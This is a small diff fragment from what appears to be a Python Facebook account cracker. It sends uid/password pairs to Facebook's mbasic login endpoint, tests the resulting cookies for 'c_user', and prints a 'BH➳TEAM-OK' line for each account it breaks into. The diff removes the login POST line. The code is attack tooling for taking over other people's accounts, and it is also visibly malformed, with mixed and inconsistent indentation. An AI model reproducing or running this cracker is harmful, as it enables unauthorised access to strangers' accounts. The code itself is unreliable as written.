@@ -1288,7 +1288,6 @@ class Main:
 }
 
 response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
-    lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
     log_cookies=session.cookies.get_dict().keys()
     if 'c_user' in log_cookies:
 				print("\r \033[0;92m[ BH➳TEAM-OK ] %s | %s\033[0;97m         "%(uid, pw))
